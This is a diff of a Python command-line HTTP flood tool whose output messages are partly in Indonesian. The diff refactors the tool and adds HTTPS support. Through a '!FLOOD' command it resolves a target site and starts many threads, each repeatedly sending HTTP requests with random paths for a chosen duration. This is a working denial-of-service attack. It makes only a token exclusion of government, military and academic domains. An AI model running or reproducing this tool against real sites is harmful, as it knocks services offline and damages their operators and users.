@@ -1,4 +1,4 @@
-# CHECK IMPORT
+# IMPORT
 try:
     import socket
     import threading
@@ -8,156 +8,152 @@ try:
     import os
     import platform
     import sys
-    import select
-    from colorama import Fore, init
+    import ssl
+    from colorama import Fore
 except ModuleNotFoundError as e:
     print(f"{e} CAN'T IMPORT . . . . ")
     exit()
 
-init(autoreset=True)
 stop_attack = threading.Event()
 
-# Clear screen
 def clear_text():
     os.system('cls' if platform.system().upper() == "WINDOWS" else 'clear')
 
-# Generate random URL path
-def generate_url_path_pyflooder(num):
-    msg = str(string.ascii_letters + string.digits + string.punctuation)
-    return "".join(random.sample(msg, int(num)))
+def generate_url_path(num):
+    chars = string.ascii_letters + string.digits + string.punctuation
+    return ''.join(random.choices(chars, k=int(num)))
 
-def generate_url_path_choice(num):
-    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
-    return ''.join(random.choice(letter) for _ in range(int(num)))
-
-# Attack logic
-def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet):
+def DoS_Attack(ip, host, port, type_attack, booter_sent, packet_type, is_https):
     if stop_attack.is_set():
         return
-    url_path = generate_url_path_pyflooder(5) if random.choice(['PY_FLOOD', 'CHOICES_FLOOD']) == "PY_FLOOD" else generate_url_path_choice(5)
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    url_path = generate_url_path(5)
+    packet_data = f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()
+
     try:
-        payload_patterns = {
-            'PY': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n",
-            'OWN1': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r",
-            'OWN2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n",
-            'OWN3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n",
-        }
-        packet_data = payload_patterns.get(data_type_loader_packet, payload_patterns['PY']).encode()
-        s.connect((ip, port))
+        if is_https:
+            context = ssl.create_default_context()
+            raw_sock = socket.create_connection((ip, port), timeout=3)
+            s = context.wrap_socket(raw_sock, server_hostname=host)
+        else:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
+
         for _ in range(booter_sent):
             if stop_attack.is_set():
                 break
             s.sendall(packet_data)
+
     except:
         pass
     finally:
-        s.close()
+        try: s.close()
+        except: pass
 
-def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet):
-    while time.time() < time_loader and not stop_attack.is_set():
-        for _ in range(min(spam_loader, 10)):
+def run_attack(ip, host, port, end_time, spam, method, booter_sent, packet_type, is_https):
+    while time.time() < end_time and not stop_attack.is_set():
+        for _ in range(min(spam, 10)):
             if stop_attack.is_set():
                 break
-            th = threading.Thread(target=DoS_Attack, args=(ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet))
-            th.start()
-            th.join()
+            t = threading.Thread(target=DoS_Attack, args=(ip, host, port, method, booter_sent, packet_type, is_https))
+            t.start()
+            t.join()
 
-# Countdown + interrupt
-def countdown_timer(time_loader):
-    remaining = int(time_loader - time.time())
-    while remaining > 0 and not stop_attack.is_set():
+def countdown_timer(end_time):
+    while not stop_attack.is_set():
+        remaining = int(end_time - time.time())
+        if remaining <= 0:
+            break
         sys.stdout.write(f"\r{Fore.YELLOW}Time remaining: {remaining} seconds{Fore.RESET}")
         sys.stdout.flush()
-
-        if sys.stdin in select.select([sys.stdin], [], [], 1)[0]:
-            _ = sys.stdin.readline()
-            stop_attack.set()
-            print(f"\n{Fore.RED}Serangan Dihentikan{Fore.RESET}")
-            return
-
         time.sleep(1)
-        remaining = int(time_loader - time.time())
+    print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")
+    stop_attack.set()
 
-    if not stop_attack.is_set():
-        print(f"\n{Fore.GREEN}Serangan Selesai{Fore.RESET}")
-        stop_attack.set()
+def stop_attack_thread():
+    input()
+    stop_attack.set()
+    print(f"\n{Fore.YELLOW}Serangan Dihentikan{Fore.RESET}")
 
-# Exit confirm
 def confirm_exit():
     while True:
-        choice = input(f"{Fore.YELLOW}Mau keluar? (y/n): {Fore.RESET}").lower()
+        sys.stdout.write(f"\r{Fore.YELLOW}Mau keluar? (y/n): {Fore.RESET}")
+        sys.stdout.flush()
+        choice = input().lower()
         if choice == 'y':
-            print(f"{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
+            print(f"\n{Fore.RED}Program terminated by user (Enter). Exiting...{Fore.RESET}")
             sys.exit(0)
         elif choice == 'n':
             print()
             return
 
-# MAIN COMMAND LOOP
 def command():
     global stop_attack
     while True:
         try:
-            data_input_loader = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
-            if not data_input_loader:
+            user_input = input(f"{Fore.CYAN}COMMAND {Fore.WHITE}${Fore.RESET} ")
+            if not user_input:
                 confirm_exit()
                 continue
-
-            args_get = data_input_loader.split(" ")
-            if args_get[0].lower() == "clear":
+            args = user_input.strip().split(" ")
+            if args[0].lower() == "clear":
                 clear_text()
-            elif args_get[0].upper() == "!FLOOD":
-                if len(args_get) == 10:
-                    data_type_loader_packet = args_get[1].upper()
-                    target_loader = args_get[2]
-                    port_loader = int(args_get[3])
-                    time_loader = time.time() + int(args_get[4])
-                    spam_loader = int(args_get[5])
-                    create_thread = min(int(args_get[6]), 10)
-                    booter_sent = int(args_get[7])
-                    methods_loader = args_get[8]
-                    spam_create_thread = min(int(args_get[9]), 10)
+            elif args[0].upper() == "!FLOOD":
+                if len(args) == 10:
+                    packet_type = args[1].upper()
+                    target_url = args[2]
+                    port = int(args[3])
+                    duration = int(args[4])
+                    spam_thread = int(args[5])
+                    create_thread = min(int(args[6]), 10)
+                    booter_sent = int(args[7])
+                    method = args[8].upper()
+                    spam_create = min(int(args[9]), 10)
 
-                    host = ''
-                    ip = ''
+                    is_https = target_url.startswith("https://")
+                    host = target_url.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0]
+
+                    if any(x in host for x in ['.gov', '.mil', '.edu', '.ac']):
+                        print(f"{Fore.GREEN}Uhh You Can't Attack This Website [{Fore.YELLOW}.gov .mil .edu .ac{Fore.WHITE}] . . .{Fore.RESET}")
+                        continue
+
                     try:
-                        host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
-                        if any(x in host for x in ['.gov', '.mil', '.edu', '.ac']):
-                            print(f"{Fore.GREEN}Uhh You Can't Attack This Website {Fore.WHITE}[ {Fore.YELLOW}.gov .mil .edu .ac {Fore.WHITE}] . . .{Fore.RESET}")
-                            continue
                         ip = socket.gethostbyname(host)
-                    except socket.gaierror:
+                    except:
                         print(f"{Fore.YELLOW}FAILED TO GET URL . . .{Fore.RESET}")
                         continue
 
                     stop_attack.clear()
-                    print(f"{Fore.LIGHTCYAN_EX}Serangan Dimulai\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}{Fore.RESET}")
+                    end_time = time.time() + duration
+
+                    print(f"{Fore.LIGHTCYAN_EX}Serangan diMulai\n{Fore.YELLOW}Target: {target_url}\nPort: {port}\nType: {packet_type}\nHTTPS: {is_https}{Fore.RESET}")
 
                     for _ in range(create_thread):
-                        for _ in range(spam_create_thread):
-                            threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet)).start()
+                        for _ in range(spam_create):
+                            t = threading.Thread(target=run_attack, args=(ip, host, port, end_time, spam_thread, method, booter_sent, packet_type, is_https))
+                            t.start()
 
-                    countdown_timer(time_loader)
+                    threading.Thread(target=countdown_timer, args=(end_time,)).start()
+                    threading.Thread(target=stop_attack_thread).start()
+
+                    while not stop_attack.is_set() and time.time() < end_time:
+                        time.sleep(0.1)
+
+                    stop_attack.set()
+                    print()
                     continue
                 else:
-                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
+                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> <HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
             else:
-                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
+                print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{user_input} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
         except KeyboardInterrupt:
-            print(f"\n{Fore.RED}Program terminated by user. Exiting...{Fore.RESET}")
+            print(f"\n{Fore.RED}Program terminated by user (Ctrl+C). Exiting...{Fore.RESET}")
             stop_attack.set()
             sys.exit(0)
 
 if __name__ == "__main__":
-    ascii_art = f"""{Fore.LIGHTBLACK_EX}
-   ______      __                 ___   __  __             __       
-  / ____/_  __/ /_  ___  _____   /   | / /_/ /_____ ______/ /_______
- / /   / / / / __ \/ _ \/ ___/  / /| |/ __/ __/ __ `/ ___/ //_/ ___/
-/ /___/ /_/ / /_/ /  __/ /     / ___ / /_/ /_/ /_/ / /__/ ,< (__  ) 
-\____/\__, /_.___/\___/_/     /_/  |_\__/\__/\__,_/\___/_/|_/____/  
-     /____/
-
-{Fore.RESET}"""
-    print(ascii_art)
-    command()
+    try:
+        command()
+    except KeyboardInterrupt:
+        print(f"\n{Fore.RED}Program terminated by user (Ctrl+C). Exiting...{Fore.RESET}")
+        stop_attack.set()
+        sys.exit(0)
